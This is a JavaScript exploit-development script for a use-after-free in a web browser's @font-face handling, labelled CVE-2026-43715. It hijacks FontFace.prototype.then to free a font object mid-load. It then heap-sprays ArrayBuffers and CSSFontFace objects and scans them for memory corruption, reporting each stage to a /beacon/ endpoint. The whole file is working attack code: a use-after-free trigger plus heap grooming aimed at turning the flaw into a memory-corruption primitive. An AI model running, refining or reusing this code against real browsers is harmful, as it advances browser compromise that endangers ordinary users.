// p451-fontface-uaf-fixedscan.js — CVE-2026-43715 UAF spray with FIXED scan
//
// V450 BUG: 0xAA000000 | sz produces signed int, getUint32 returns unsigned.
// FIX: Use small positive markers (0x00010000 | sz) that don't cross sign boundary.
// Also: spray with DIFFERENT patterns per offset to detect which exact offset
// gets corrupted by the m_status write.
(function() {
    var RUN = 'p451-' + Date.now().toString(36);
    function B(tag, body) {
        try {
            var x = new XMLHttpRequest();
            x.open('POST', '/beacon/' + tag + '/' + RUN, false);
            x.send(typeof body === 'object' ? JSON.stringify(body) : (body || ''));
        } catch(e) {}
    }

    B('BOOT', navigator.userAgent);

    // ═══════════════════════════════════════════════════════════════
    // TEST A: Every 16-byte size class, 128-640, small positive markers
    // Fill pattern: each dword = (offset_in_buffer << 16) | buffer_index
    // This lets us detect WHICH offset was written (m_status location)
    // ═══════════════════════════════════════════════════════════════
    try {
        var styleA = document.createElement('style');
        styleA.textContent = "@font-face { font-family: 'p451a'; src: local('Arial'); }";
        document.head.appendChild(styleA);
        document.body.offsetHeight;

        var ruleA = styleA.sheet.cssRules[0];

        var faceA = null;
        var it = document.fonts.values();
        var e;
        while (!(e = it.next()).done) {
            if (e.value.family.replace(/['"]/g, '') === 'p451a') { faceA = e.value; break; }
        }

        if (!faceA) { B('A-DEAD', 'NO-FACE'); }
        else {
            var thenA = 0, aErr = '';
            // Store spray per size: {size → ArrayBuffer[]}
            var allSpray = {};

            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenA++;
                if (thenA > 1) return undefined;
                try {
                    // Trigger adopt → free old CSSFontFace
                    ruleA.style.setProperty('font-weight', 'bold');
                    document.body.offsetHeight;

                    // Spray every 16-byte size class from 128 to 640
                    for (var sz = 128; sz <= 640; sz += 16) {
                        var arr = [];
                        for (var i = 0; i < 200; i++) {
                            var ab = new ArrayBuffer(sz);
                            var dv = new DataView(ab);
                            // Pattern: each dword = 0x50000000 + offset
                            // Using 0x50.. which is positive in both signed and unsigned
                            for (var off = 0; off < sz; off += 4) {
                                dv.setUint32(off, 0x50000000 + off, true);
                            }
                            arr.push(ab);
                        }
                        allSpray[sz] = arr;
                    }
                } catch(e) { aErr += e.message; }
                return undefined;
            }, configurable: true });

            try { faceA.load(); } catch(e) { aErr += '|load:' + e.message; }
            try { delete FontFace.prototype.then; } catch(e) {}

            B('A-RESULT', {thenFired: thenA, err: aErr, statusAfter: faceA.status});

            // Scan ALL sizes for corruption
            var hitSizes = [];
            for (var sz = 128; sz <= 640; sz += 16) {
                var arr = allSpray[sz];
                if (!arr) continue;
                var corruptCount = 0;
                var details = [];
                for (var k = 0; k < arr.length; k++) {
                    var dv = new DataView(arr[k]);
                    var foundCorrupt = false;
                    for (var off = 0; off < sz; off += 4) {
                        var expected = 0x50000000 + off;
                        var actual = dv.getUint32(off, true);
                        if (actual !== expected) {
                            foundCorrupt = true;
                            if (details.length < 3) {
                                details.push({idx:k, off:off, exp:expected.toString(16), got:actual.toString(16)});
                            }
                            break;
                        }
                    }
                    if (foundCorrupt) corruptCount++;
                }
                if (corruptCount > 0) {
                    hitSizes.push({sz:sz, n:corruptCount, d:details});
                }
            }

            B('A-SPRAY', {hits: hitSizes.length, sizes: hitSizes.slice(0, 20)});
        }
    } catch(e) { B('A-ERR', e.message.slice(0,100)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST B: Same-type CSSFontFace spray + DIFFERENT src to avoid
    // local('Arial') synchronous load (which might complicate things)
    // Use local('NonexistentFont') → stays Pending → status "unloaded"
    // If UAF writes Success → one face shows "loaded" → DETECTED
    // ═══════════════════════════════════════════════════════════════
    try {
        var styleB = document.createElement('style');
        styleB.textContent = "@font-face { font-family: 'p451b'; src: local('Arial'); }";
        document.head.appendChild(styleB);
        document.body.offsetHeight;

        var ruleB = styleB.sheet.cssRules[0];

        var faceB = null;
        var it2 = document.fonts.values();
        var e2;
        while (!(e2 = it2.next()).done) {
            if (e2.value.family.replace(/['"]/g, '') === 'p451b') { faceB = e2.value; break; }
        }

        if (!faceB) { B('B-DEAD', 'NO-FACE'); }
        else {
            var thenB = 0, bErr = '';

            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenB++;
                if (thenB > 1) return undefined;
                try {
                    ruleB.style.setProperty('font-weight', 'bold');
                    document.body.offsetHeight;

                    // Spray with CSSFontFace objects using NONEXISTENT fonts
                    // These stay Pending (status "unloaded")
                    // If UAF overwrites m_status with Success, they'd report "loaded"
                    for (var i = 0; i < 100; i++) {
                        var s = document.createElement('style');
                        // Use url() with invalid data to keep face in Pending state
                        s.textContent = "@font-face { font-family: 'xf" + i + "'; src: local('ZZZZZ_NoSuchFont_" + i + "'); }";
                        document.head.appendChild(s);
                    }
                    document.body.offsetHeight;
                } catch(e) { bErr += e.message; }
                return undefined;
            }, configurable: true });

            try { faceB.load(); } catch(e) { bErr += '|load:' + e.message; }
            try { delete FontFace.prototype.then; } catch(e) {}

            B('B-RESULT', {thenFired: thenB, err: bErr, statusAfter: faceB.status});

            // Check all xf* faces for unexpected status
            var unexpected = [];
            var totalXf = 0;
            var it3 = document.fonts.values();
            var e3;
            while (!(e3 = it3.next()).done) {
                var fn = e3.value.family.replace(/['"]/g, '');
                if (fn.indexOf('xf') === 0) {
                    totalXf++;
                    // local('nonexistent') should fail → status "error" or stay "unloaded"
                    if (e3.value.status === 'loaded') {
                        unexpected.push({f: fn, s: e3.value.status});
                    }
                }
            }
            B('B-CHECK', {total: totalXf, loaded: unexpected.length, details: unexpected.slice(0,10)});
        }
    } catch(e) { B('B-ERR', e.message.slice(0,100)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST C: Observe UAF side effects via document.fonts state
    // After adopt(), check if m_activeCount was double-decremented
    // by loading ANOTHER font and checking if events fire correctly
    // ═══════════════════════════════════════════════════════════════
    try {
        var styleC = document.createElement('style');
        styleC.textContent = "@font-face { font-family: 'p451c'; src: local('Arial'); }";
        document.head.appendChild(styleC);
        document.body.offsetHeight;

        var ruleC = styleC.sheet.cssRules[0];

        var faceC = null;
        var it4 = document.fonts.values();
        var e4;
        while (!(e4 = it4.next()).done) {
            if (e4.value.family.replace(/['"]/g, '') === 'p451c') { faceC = e4.value; break; }
        }

        if (!faceC) { B('C-DEAD', 'NO-FACE'); }
        else {
            var thenC = 0, cErr = '';

            // Track loadingdone events
            var loadingDoneCount = 0;
            document.fonts.onloadingdone = function(evt) { loadingDoneCount++; };
            var loadingCount = 0;
            document.fonts.onloading = function(evt) { loadingCount++; };

            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenC++;
                if (thenC > 1) return undefined;
                try {
                    ruleC.style.setProperty('font-weight', '900');
                    document.body.offsetHeight;
                } catch(e) { cErr += e.message; }
                return undefined;
            }, configurable: true });

            try { faceC.load(); } catch(e) { cErr += '|load:' + e.message; }
            try { delete FontFace.prototype.then; } catch(e) {}

            B('C-AFTER-ADOPT', {
                thenFired: thenC,
                statusAfter: faceC.status,
                fontsStat: document.fonts.status,
                loadingDone: loadingDoneCount,
                loading: loadingCount
            });

            // Now load ANOTHER font to test if the state machine is broken
            var styleC2 = document.createElement('style');
            styleC2.textContent = "@font-face { font-family: 'p451c2'; src: local('Arial'); }";
            document.head.appendChild(styleC2);
            document.body.offsetHeight;

            var faceC2 = null;
            var it5 = document.fonts.values();
            var e5;
            while (!(e5 = it5.next()).done) {
                if (e5.value.family.replace(/['"]/g, '') === 'p451c2') { faceC2 = e5.value; break; }
            }

            if (faceC2) {
                faceC2.load();
                B('C-SECOND-LOAD', {
                    status: faceC2.status,
                    fontsStat: document.fonts.status,
                    loadingDone: loadingDoneCount,
                    loading: loadingCount
                });
            }
        }
    } catch(e) { B('C-ERR', e.message.slice(0,100)); }

    B('ALIVE', 'all-tests-completed');
    B('DONE', RUN);
})();
